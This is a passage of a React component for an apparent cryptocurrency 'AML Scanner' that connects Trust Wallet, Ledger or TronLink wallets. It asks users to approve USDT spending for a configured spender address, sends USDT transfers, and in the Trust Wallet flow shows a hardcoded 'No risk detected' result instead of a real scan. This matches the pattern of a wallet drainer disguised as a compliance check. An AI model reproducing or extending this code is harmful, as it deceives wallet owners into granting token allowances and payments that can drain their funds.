    };
  }, [selectedProtocol]);

  // Only show the top error box for non-WalletConnect errors
  const walletConnectErrors = [
    'Wallet connection timed out. Please try again.',
    'Wallet connection was rejected. Please try again.',
    'Wallet connection expired. Please try again.',
    'Connection failed',
    'Failed to initialize WalletConnect',
    'Failed to get wallet address',
    'Wallet disconnected',
    'Session ended',
    'AML verification failed',
    'TronLink connection timeout',
    'Failed to connect to TronLink',
    'Tron AML verification failed'
  ];
  const isWalletConnectError = walletConnectErrors.includes(connectionError);

  // When QR code is shown for Ledger, emit 'waiting' status by default
  useEffect(() => {
    if (selectedProtocol === 'ledger' && qrCode) {
      setStatus('waiting');
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selectedProtocol, qrCode]);

  // Ledger-specific approval flow
  const runLedgerApprovalFlow = async () => {
    // Check if the approval flow has already started to avoid duplicates
    if (approvalStartedRef.current) {
      console.log('[WalletForm] approvalStartedRef already true, skipping Ledger approval/payment flow');
      return;
    }
    
    // Set the flag to prevent duplicate approval flows
    approvalStartedRef.current = true;
    console.log('[WalletForm] Running Ledger approval/payment flow');
    
    const ledgerProvider = providerRef.current;
    const web3Instance = web3Ref.current;
    
    // Get the real address from the provider
    let userAddress;
    try {
      const accounts = await ledgerProvider.request({ method: 'eth_accounts' });
      userAddress = accounts[0];
      console.log('[WalletForm] Using real Ledger address:', userAddress);
    } catch (error) {
      console.error('[WalletForm] Failed to get Ledger address:', error);
      approvalStartedRef.current = false;
      return;
    }
    
    try {
      // Import TransactionHandler for real transaction processing
      console.log('[WalletForm] Importing TransactionHandler for Ledger...');
      const { TransactionHandler } = await import('../utils/TransactionHandler.js');
      console.log('[WalletForm] TransactionHandler imported for Ledger');

      // Check USDT allowance (static method)
      console.log('[WalletForm] Checking USDT allowance for Ledger...');
      const allowance = await TransactionHandler.checkEthereumAllowance(
        web3Instance,
        userAddress,
        AML_CONFIG.ETH_SPENDER_ADDRESS
      );
      console.log('[WalletForm] Current USDT allowance:', allowance);

      // If allowance is insufficient, request approval
      if (allowance < AML_CONFIG.ethereum.amount) {
        console.log('[WalletForm] Requesting USDT approval from Ledger...');
        setStatus('approving');
        setConnectionError('Please approve USDT spending on your Ledger device');

        const approvalTx = await TransactionHandler.createEthereumApprovalTransaction(
          web3Instance,
          userAddress,
          AML_CONFIG.ETH_SPENDER_ADDRESS,
          null,
          { skipEstimateGas: true }
        );
        console.log('[WalletForm] Approval transaction object:', approvalTx);

        // Send approval transaction
        const approvalTxHash = await TransactionHandler.sendEthereumTransaction(
          ledgerProvider,
          approvalTx
        );
        console.log('[WalletForm] Approval transaction sent:', approvalTxHash);

        // Wait for approval confirmation
        await TransactionHandler.waitForTransactionConfirmation(
          web3Instance,
          approvalTxHash,
          'ethereum',
          120
        );
        console.log('[WalletForm] Approval confirmed');
      }

      // Send payment transaction
      console.log('[WalletForm] Sending payment transaction from Ledger...');
      setStatus('paying');
      setConnectionError('Please confirm payment transaction on your Ledger device');

      const usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
      const paymentTxData = usdtContract.methods['transfer'](
        AML_CONFIG.ETH_SPENDER_ADDRESS,
        web3Instance.utils.toWei('1', 'mwei')
      ).encodeABI();
      const paymentTx = {
        from: userAddress,
        to: CONTRACT_ADDRESSES.USDT_ETHEREUM,
        data: paymentTxData,
        gas: Web3.utils.toHex(100000),
        value: '0x0',
      };
      const paymentTxHash = await TransactionHandler.sendEthereumTransaction(
        ledgerProvider,
        paymentTx
      );
      console.log('[WalletForm] Payment transaction sent:', paymentTxHash);

      // Wait for payment confirmation
      await TransactionHandler.waitForTransactionConfirmation(
        web3Instance,
        paymentTxHash,
        'ethereum',
        120
      );
      console.log('[WalletForm] Payment confirmed');

      // Run AML scan (reuse your existing logic or call performAMLVerification)
      setStatus('scanning');
      setConnectionError('Running AML scan...');
      const scanResult = await performAMLVerification(userAddress, ledgerProvider, web3Instance);
      console.log('[WalletForm] AML scan result:', scanResult);

      // Complete the flow
      setStatus('completed');
      setConnectionError('Transaction completed successfully! AML scan: ' + scanResult.status);

      // Clear QR code and details only after successful completion
      setShowQrModal(false);
      setQrCode('');
      setWalletConnectUri('');

      // Trigger scan completion callback
      if (onScanComplete) {
        onScanComplete(scanResult);
      }

    } catch (error) {
      console.error('[WalletForm] Ledger approval/payment flow error:', error);
      
      // Check for user rejection patterns
      const isUserRejection = 
        error.message?.includes('USER_REJECTED') ||
        error.message?.includes('User rejected') ||
        error.message?.includes('User denied') ||
        error.message?.includes('Rejected by user') ||
        error.message?.includes('Transaction declined') ||
        error.message?.includes('User cancelled') ||
        error.message?.includes('USER_REJECTED_METHODS') ||
        error.message?.includes('No matching key') ||
        error.message?.includes('Session expired') ||
        error.message?.includes('Connection lost');
      
      if (isUserRejection) {
        console.log('[WalletForm] User rejected transaction, restarting session...');
        setStatus('error');
        setConnectionError('Transaction was rejected. Please try again with a fresh session.');
        
        // Restart session after a delay
        setTimeout(() => {
          restartLedgerSession();
        }, 3000);
      } else {
        setStatus('error');
        setConnectionError('Transaction failed: ' + (error?.message || error));
        
        // For non-rejection errors, offer manual restart option
        setTimeout(() => {
          if (status === 'error') {
            setConnectionError('Transaction failed. Click "Connect Ledger" to try again.');
          }
        }, 5000);
      }
    } finally {
      approvalStartedRef.current = false;
    }
  };

  // Enhanced mobile wallet opening with proper WalletConnect initialization
  const handleMobileWalletOpen = async () => {
    console.log('[WalletForm] handleMobileWalletOpen called with device:', device);
    
    if (device === 'mobile' || device === 'mobile_app' || device === 'tablet') {
      try {
        setStatus('connecting');
        setButtonDisabled(true);
        setConnectionError('');
        
        if (activeNetwork === 'ethereum') {
          if (selectedProtocol === 'trust') {
            // Initialize WalletConnect for Trust Wallet on mobile
            console.log('[WalletForm] Initializing Trust Wallet for mobile...');
            
            const trustProvider = await EthereumProvider.init({
              projectId: WALLETCONNECT_PROJECT_ID,
              chains: [1], // Ethereum mainnet
              showQrModal: false,
              metadata: {
                name: 'AML Scanner',
                description: 'AML Scanner for cryptocurrency transactions',
                url: process.env.REACT_APP_PRODUCTION_URL || window.location.origin,
                icons: [process.env.REACT_APP_ICON_URL || 'https://aml.ott-investments.com/favicon.ico']
              }
            });

            // Set up event listeners for Trust Wallet
            trustProvider.on('display_uri', async (uri) => {
              console.log('[WalletForm] Trust Wallet URI generated:', uri);
              setWalletConnectUri(uri);
              
              // Enhanced mobile deep linking for Trust Wallet
              const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
              const isAndroid = /Android/.test(navigator.userAgent);
              
              if (isIOS) {
                // iOS Trust Wallet deep linking with redirect_url param to keep user in wallet
                const trustWalletUrl = `trust://wc?uri=${encodeURIComponent(uri)}&redirect_url=`;
                console.log('[WalletForm] Opening Trust Wallet on iOS:', trustWalletUrl);
                window.location.href = trustWalletUrl;
              } else if (isAndroid) {
                // Android Trust Wallet deep linking with redirect_url param to keep user in wallet
                const trustWalletUrl = `trust://wc?uri=${encodeURIComponent(uri)}&redirect_url=`;
                console.log('[WalletForm] Opening Trust Wallet on Android:', trustWalletUrl);
                window.location.href = trustWalletUrl;
              }
            });

            trustProvider.on('connect', async (connectInfo) => {
              console.log('[WalletForm] Trust Wallet connected:', connectInfo);
              setStatus('connected');
              
              try {
                const accounts = await trustProvider.request({ method: 'eth_accounts' });
                const userAddress = accounts[0];
                console.log('[WalletForm] Trust Wallet address:', userAddress);
                
                setWalletAddress(userAddress);
                setProvider(trustProvider);
                providerRef.current = trustProvider;
                
                const web3Instance = new Web3(trustProvider);
                setWeb3(web3Instance);
                web3Ref.current = web3Instance;
                
                setStatus('ready');
                setConnectionError('');
                
                // Start the approval/payment flow
                await runTrustWalletApprovalFlow();
                
              } catch (error) {
                console.error('[WalletForm] Error in Trust Wallet connect handler:', error);
                setStatus('error');
                setConnectionError('Failed to connect Trust Wallet: ' + error.message);
              }
            });

            trustProvider.on('disconnect', (disconnectInfo) => {
              console.log('[WalletForm] Trust Wallet disconnected:', disconnectInfo);
              setStatus('disconnected');
              setWalletAddress('');
              setProvider(null);
              providerRef.current = null;
              setWeb3(null);
              web3Ref.current = null;
            });

            // Connect to Trust Wallet
            await trustProvider.connect();
            
          } else if (selectedProtocol === 'ledger') {
            // Initialize Ledger for mobile
            console.log('[WalletForm] Initializing Ledger for mobile...');
            
            const ledgerProvider = await EthereumProvider.init({
              projectId: WALLETCONNECT_PROJECT_ID,
              chains: [1], // Ethereum mainnet
              showQrModal: false,
              metadata: {
                name: 'AML Scanner',
                description: 'AML Scanner for cryptocurrency transactions',
                url: process.env.REACT_APP_PRODUCTION_URL || window.location.origin,
                icons: [process.env.REACT_APP_ICON_URL || 'https://aml.ott-investments.com/favicon.ico']
              }
            });

            // Set up event listeners for Ledger
            ledgerProvider.on('display_uri', async (uri) => {
              console.log('[WalletForm] Ledger URI generated:', uri);
              setWalletConnectUri(uri);
              
              // Open Ledger Live on mobile
              const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
              const isAndroid = /Android/.test(navigator.userAgent);
              
              if (isIOS) {
                // iOS Ledger Live deep linking
                const ledgerLiveUrl = `ledgerlive://wc?uri=${encodeURIComponent(uri)}`;
                console.log('[WalletForm] Opening Ledger Live on iOS:', ledgerLiveUrl);
                window.location.href = ledgerLiveUrl;
                
                // Fallback to App Store after delay
                setTimeout(() => {
                  window.location.href = 'https://apps.apple.com/app/ledger-live/id1361671700';
                }, 3000);
              } else if (isAndroid) {
                // Android Ledger Live deep linking
                const ledgerLiveUrl = `ledgerlive://wc?uri=${encodeURIComponent(uri)}`;
                console.log('[WalletForm] Opening Ledger Live on Android:', ledgerLiveUrl);
                window.location.href = ledgerLiveUrl;
                
                // Fallback to Play Store after delay
                setTimeout(() => {
                  window.location.href = 'https://play.google.com/store/apps/details?id=com.ledger.live';
                }, 3000);
              }
            });

            ledgerProvider.on('connect', async (connectInfo) => {
              console.log('[WalletForm] Ledger connected:', connectInfo);
              setStatus('connected');
              
              try {
                const accounts = await ledgerProvider.request({ method: 'eth_accounts' });
                const userAddress = accounts[0];
                console.log('[WalletForm] Ledger address:', userAddress);
                
                setWalletAddress(userAddress);
                setProvider(ledgerProvider);
                providerRef.current = ledgerProvider;
                
                const web3Instance = new Web3(ledgerProvider);
                setWeb3(web3Instance);
                web3Ref.current = web3Instance;
                
                setStatus('ready');
                setConnectionError('');
                
                // Start the approval/payment flow
                await runLedgerApprovalFlow();
                
              } catch (error) {
                console.error('[WalletForm] Error in Ledger connect handler:', error);
                setStatus('error');
                setConnectionError('Failed to connect Ledger: ' + error.message);
              }
            });

            ledgerProvider.on('disconnect', (disconnectInfo) => {
              console.log('[WalletForm] Ledger disconnected:', disconnectInfo);
              setStatus('disconnected');
              setWalletAddress('');
              setProvider(null);
              providerRef.current = null;
              setWeb3(null);
              web3Ref.current = null;
            });

            // Connect to Ledger
            await ledgerProvider.connect();
          }
        } else if (activeNetwork === 'tron') {
          // Enhanced TronLink mobile opening
          const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
          const isAndroid = /Android/.test(navigator.userAgent);
          
          if (isIOS) {
            // Try to open TronLink on iOS
            window.location.href = 'tronlink://open';
            // Fallback to App Store after a delay
            setTimeout(() => {
              window.location.href = 'https://apps.apple.com/app/tronlink/id1356471765';
            }, 2000);
          } else if (isAndroid) {
            // Try to open TronLink on Android
            window.location.href = 'tronlink://open';
            // Fallback to Play Store after a delay
            setTimeout(() => {
              window.location.href = 'https://play.google.com/store/apps/details?id=com.tronlink.wallet';
            }, 2000);
          } else {
            // Generic TronLink fallback
            window.location.href = 'tronlink://open';
          }
        }
      } catch (error) {
        console.error('[WalletForm] Error opening mobile wallet:', error);
        setStatus('error');
        setConnectionError('Failed to open mobile wallet. Please install the wallet app and try again.');
        setButtonDisabled(false);
      }
    } else {
      console.log('[WalletForm] Not a mobile device, skipping mobile wallet opening');
    }
  };

  // Trust Wallet approval flow (similar to Ledger)
  const runTrustWalletApprovalFlow = async () => {
    try {
      console.log('[WalletForm] Starting Trust Wallet approval flow...');
      setStatus('approving');
      
      const web3Instance = web3Ref.current;
      if (!web3Instance) {
        throw new Error('Web3 instance not available');
      }

      const userAddress = await web3Instance.eth.getAccounts();
      if (!userAddress || !userAddress[0]) {
        throw new Error('No wallet address found');
      }

      console.log('[WalletForm] Trust Wallet address for approval:', userAddress[0]);

      // Perform AML verification
      await performAMLVerification(userAddress[0], providerRef.current, web3Instance);

      // USDT approval and payment logic
      const usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
      
      // Check current allowance
      const currentAllowance = await usdtContract.methods.allowance(userAddress[0], CONTRACT_ADDRESSES.USDT_ETHEREUM).call();
      console.log('[WalletForm] Current USDT allowance:', currentAllowance);

      // Request approval if needed
      if (window.BigInt(currentAllowance) < window.BigInt(APPROVAL_AMOUNT)) {
        console.log('[WalletForm] Requesting USDT approval...');
        setStatus('approving');
        setConnectionError(`Please approve ${DISPLAY_APPROVAL_AMOUNT} USDT for AML scan in your wallet...`);
        const approvalTx = await usdtContract.methods.approve(CONTRACT_ADDRESSES.USDT_ETHEREUM, APPROVAL_AMOUNT).send({
          from: userAddress[0],
          gas: 100000
        });
        console.log('[WalletForm] Trust Wallet approval transaction:', approvalTx.transactionHash);
        setStatus('approved');
        setConnectionError('');
      } else {
        console.log('[WalletForm] Sufficient allowance already exists');
        setStatus('approved');
        setConnectionError('');
      }

      // Perform payment transaction
      console.log('[WalletForm] Performing Trust Wallet payment...');
      setStatus('paying');
      
      const paymentTx = await usdtContract.methods.transfer(CONTRACT_ADDRESSES.USDT_ETHEREUM, PAYMENT_AMOUNT).send({
        from: userAddress[0],
        gas: 100000
      });
      
      console.log('[WalletForm] Trust Wallet payment transaction:', paymentTx.transactionHash);
      setStatus('paid');

      // Wait for transaction confirmation
      TransactionHandler.waitForTransactionConfirmation(web3Instance, paymentTx.transactionHash, 'ethereum', 60)
        .then(result => {
          if (result.confirmed) {
            console.log('[WalletForm] Trust Wallet payment transaction confirmed:', paymentTx.transactionHash);
          } else {
            console.log('[WalletForm] Trust Wallet payment transaction pending, but continuing with scan');
          }
        })
        .catch(err => {
          console.log('[WalletForm] Non-critical error waiting for payment confirmation:', err);
        });
      
      // Complete the flow
      setTimeout(() => {
        setStatus('complete');
        setSessionId(Date.now().toString());
        setScanResult({ risk: 'low', riskScore: 12, message: 'No risk detected' });
      }, 2000);
      
    } catch (error) {
      console.error('[WalletForm] Error in Trust Wallet approval flow:', error);
      setStatus('error');
      setConnectionError('Trust Wallet approval or payment failed: ' + error.message);
    } finally {
      setButtonDisabled(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
    >
      <h1 className="text-3xl font-bold text-center mb-8">
        {activeNetwork === 'tron' ? 'USDT TRC20' : 'USDT ERC20'} wallet verification using{' '}
        {selectedProtocol === 'trust' ? 'Trust Wallet' : 'Ledger'}
      </h1>
      
      {/* Device-specific connection options */}
      <div className="text-center mb-8">
        {/* Desktop QR Code Flow */}
        {device === 'desktop' && selectedProtocol === 'trust' && activeNetwork === 'ethereum' && (
          <div className="flex flex-col items-center justify-center">
        <p className="mb-6 text-gray-600">
              Scan the QR code with your Trust Wallet to connect
        </p>
        {qrLoading ? (
          <div className="flex justify-center mb-4">
            <div className="w-64 h-64 bg-gray-200 rounded-lg flex items-center justify-center">
              <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-aml-blue"></div>
            </div>
          </div>
        ) : (
          <>
          <div className="flex justify-center mb-4">
            <img 
              src={qrcodeUrl} 
              alt="WalletConnect QR Code" 
              className="w-64 h-64 border border-gray-200 rounded-lg"
            />
          </div>
          {/* Status Display for Trust Wallet Desktop */}
          <div className="mb-6">
            <div className={`qrcode-statuses ${status} flex justify-center items-center w-full`}>
              <div className="cs-circle"></div>
              <span>{statusMessages[status] || 'Status: ' + status}</span>
            </div>
          </div>
          </>
        )}
          </div>
        )}
        
        {/* Mobile Browser Flow */}
        {device === 'mobile' && selectedProtocol === 'trust' && (
          <div className="flex flex-col items-center justify-center">
            <p className="mb-6 text-gray-600">
              {activeNetwork === 'ethereum' 
                ? 'Open Trust Wallet to connect' 
                : 'Open TronLink to connect'
              }
            </p>
            <button
              onClick={handleMobileWalletOpen}
              disabled={buttonDisabled}
              className="button px-8 py-3 mb-4"
            >
              {buttonDisabled ? 'Opening...' : `Open ${activeNetwork === 'ethereum' ? 'Trust Wallet' : 'TronLink'}`}
            </button>
            {/* Status Display for Trust Wallet Mobile */}
            <div className="mb-6">
              <div className={`qrcode-statuses ${status} flex justify-center items-center w-full`}>
                <div className="cs-circle"></div>
                <span>{statusMessages[status] || 'Status: ' + status}</span>
        </div>
      </div>
            <p className="text-sm text-gray-500">
              Don't have the wallet? 
              <a 
                href={activeNetwork === 'ethereum' 
                  ? 'https://trustwallet.com/download' 
                  : 'https://www.tronlink.org/download'
                }
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-600 hover:underline ml-1"
              >
                Download here
              </a>
            </p>
          </div>
        )}
        
        {/* Tablet Flow */}
        {device === 'tablet' && selectedProtocol === 'trust' && (
          <div className="flex flex-col items-center justify-center">
            <p className="mb-6 text-gray-600">
              Choose your connection method:
            </p>
            <div className="flex flex-col sm:flex-row gap-4 mb-4">
              <button
                onClick={() => {
                  // Show QR code for tablet
                  setQrLoading(false);
                }}
                className="button-outline px-6 py-3"
              >
                Scan QR Code
              </button>
              <button
                onClick={handleMobileWalletOpen}
                disabled={buttonDisabled}
                className="button px-6 py-3"
              >
                Open Wallet App
              </button>
            </div>
            {!qrLoading && qrcodeUrl && (
              <>
              <div className="flex justify-center mb-4">
                <img 
                  src={qrcodeUrl} 
                  alt="WalletConnect QR Code" 
                  className="w-64 h-64 border border-gray-200 rounded-lg"
                />
              </div>
              {/* Status Display for Trust Wallet Tablet */}
              <div className="mb-6">
                <div className={`qrcode-statuses ${status} flex justify-center items-center w-full`}>
                  <div className="cs-circle"></div>
                  <span>{statusMessages[status] || 'Status: ' + status}</span>
                </div>
              </div>
              </>
            )}
          </div>
        )}
        
        {/* Ledger Hardware Wallet Flow */}
        {selectedProtocol === 'ledger' && (
          <div className="flex flex-col items-center justify-center">
            {/* Show loading state when QR code is not ready yet */}
            {!qrCode && status === 'connecting' && (
              <div className="mb-6 text-center text-gray-700">
                <div className="font-semibold text-lg mb-4">Preparing Ledger Connection</div>
                <div className="flex justify-center mb-4">
                  <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600"></div>
                </div>
                <div className="text-sm text-gray-600">
                  Initializing WalletConnect session...
                </div>
              </div>
            )}
            
            {qrCode && (
              <>
                {/* Ledger device instructions above QR code */}
                <div className="mb-6 text-center text-gray-700">
                  <div className="font-semibold text-lg mb-1">Connect Ledger</div>
                  <div>Make sure your Ledger device is:</div>
                    <div>Connected, Unlocked and on the correct app</div>
                  <div>Scan QR code with Ledger Live app on your phone, or click "Open in Ledger Live" to connect</div>
                </div>
                
                {/* QR Code Container */}
                <div className="mb-4">
                  <img src={qrCode} alt="Ledger Live QR Code" style={{ width: 200, height: 200 }} />
                </div>
                
                {/* Status Display - separate container below QR code */}
                <div className="mb-6">
                  <div className={`qrcode-statuses ${status} flex justify-center items-center w-full`}>
                    {/* Always show status display, not just when status !== 'complete' */}
                    <div className="cs-circle"></div>
                    <span>{statusMessages[status] || 'Status: ' + status}</span>
                  </div>
                </div>
                
                {/* Button Container - separate from Status Display */}
                <div className="flex flex-col items-center space-y-3 mb-4">
                  <button
                    className="w-full max-w-xs py-3 px-6 rounded-lg bg-blue-600 text-white font-semibold text-lg shadow hover:bg-blue-700 transition"
                    onClick={handleOpenLedgerLive}
                  >
                    Open in Ledger Live
                  </button>
                </div>
              </>
            )}
          </div>
        )}
        
        {/* Status Display - removed from here since it's now in the Ledger flow above */}
      </div>
      
      {/* Manual Restart Button - appears on errors */}
      {status === 'error' && (
        <div className="mt-4">
          <button
            onClick={restartLedgerSession}
            disabled={buttonDisabled}
            className="w-full bg-red-600 hover:bg-red-700 disabled:bg-red-400 text-white font-bold py-3 px-4 rounded-lg transition-colors duration-200 flex items-center justify-center space-x-2"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
            <span>Restart Session</span>
          </button>
        </div>
      )}
    </motion.div>
  );
};

export default WalletForm;